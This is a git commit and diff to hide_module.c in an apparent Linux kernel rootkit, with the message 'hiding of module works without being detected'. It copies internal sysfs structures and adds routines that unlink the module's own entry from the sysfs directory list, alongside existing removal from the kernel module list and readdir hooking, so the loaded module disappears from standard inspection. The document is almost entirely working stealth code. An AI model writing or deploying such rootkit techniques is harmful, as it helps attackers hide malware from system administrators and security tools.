2ddf232e404c48c7a352cbb1b95e5b8743c7f259
Roman Karlstetter <roman@rm-karlstetter.de>
2012-02-04 15:09:45 +0100

    hiding of module works without being detected

--- hide_module.c
+++ hide_module.c
@@ -1,6 +1,7 @@
 #include <linux/module.h>    /* Needed by all modules */
 #include <linux/kernel.h>    /* Needed for KERN_INFO */
 #include <linux/fs.h>
+#include <linux/sysfs.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
@@ -11,6 +12,8 @@
 typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
 fun_int_file_dirent_filldir_t original_sysfs_readdir;
 filldir_t original_sysfs_filldir;
+
+struct sysfs_dirent *this_module_dirent;
 
 int hidden = 0;
 
@@ -39,6 +42,106 @@ void hook_sysfs(void){
 }
 
 
+/**
+ * Taken from fs/sysfs/sysfs.h
+ */
+struct sysfs_elem_dir {
+        struct kobject          *kobj;
+        /* children list starts here and goes through sd->s_sibling */
+        struct sysfs_dirent     *children;
+};
+
+struct sysfs_elem_symlink {
+        struct sysfs_dirent     *target_sd;
+};
+
+struct sysfs_elem_attr {
+        struct attribute        *attr;
+        struct sysfs_open_dirent *open;
+};
+
+struct sysfs_elem_bin_attr {
+        struct bin_attribute    *bin_attr;
+        struct hlist_head       buffers;
+};
+
+struct sysfs_inode_attrs {
+        struct iattr    ia_iattr;
+        void            *ia_secdata;
+        u32             ia_secdata_len;
+};
+
+struct sysfs_dirent {
+        atomic_t                s_count;
+        atomic_t                s_active;
+        struct sysfs_dirent     *s_parent;
+        struct sysfs_dirent     *s_sibling;
+        const char              *s_name;
+
+        union {
+                struct sysfs_elem_dir           s_dir;
+                struct sysfs_elem_symlink       s_symlink;
+                struct sysfs_elem_attr          s_attr;
+                struct sysfs_elem_bin_attr      s_bin_attr;
+        };
+
+        unsigned int            s_flags;
+        ino_t                   s_ino;
+        umode_t                 s_mode;
+        struct sysfs_inode_attrs *s_iattr;
+};
+
+void remove_from_sysfs_list(void){
+    struct module *mod = THIS_MODULE;
+    struct sysfs_dirent *entry, *parent, *last;
+    int count;
+    // Get internal file descriptor of the module directory of sysfs
+    entry = mod->mkobj.kobj.sd;
+    parent = entry->s_parent;
+
+    last = 0;
+    for (entry = parent->s_dir.children; entry; entry = entry->s_sibling)
+    {
+        if(strcmp(entry->s_name, THIS_MODULE->name) == 0){
+            this_module_dirent = entry;
+            if(last == 0){
+                parent->s_dir.children = entry->s_sibling;
+            } else {
+                last->s_sibling = entry->s_sibling;
+            }
+            break;
+        }
+        last = entry;
+        //OUR_DEBUG("name: %s", entry->s_name);
+    }
+
+    count = 0;
+    // Loop over all modules and count
+    for (entry = parent->s_dir.children; entry; entry = entry->s_sibling)
+    {
+        count++;
+    }
+    OUR_DEBUG("count: %d", count);
+}
+
+void reinsert_to_sysfs_list(void){
+    struct sysfs_dirent *parent, *entry;
+    int count;
+
+    parent = this_module_dirent->s_parent;
+    this_module_dirent->s_sibling = parent->s_dir.children;
+    parent->s_dir.children = this_module_dirent;
+
+    count = 0;
+    // Loop over all modules and count
+    for (entry = parent->s_dir.children; entry; entry = entry->s_sibling)
+    {
+        count++;
+    }
+    OUR_DEBUG("count: %d", count);
+}
+
+
 void unhook_sysfs(void){
     struct file_operations* sysfs_dir_ops;
     sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
@@ -52,6 +155,7 @@ void unhook_sysfs(void){
  */
 void hide_module(void)
 {
+    remove_from_sysfs_list();
     if(hidden == 1)
         return;
     list_del(&(THIS_MODULE->list));
@@ -63,6 +167,7 @@ void hide_module(void)
 
 void unhide_module(void)
 {
+    reinsert_to_sysfs_list();
     if(hidden == 0)
         return;
 
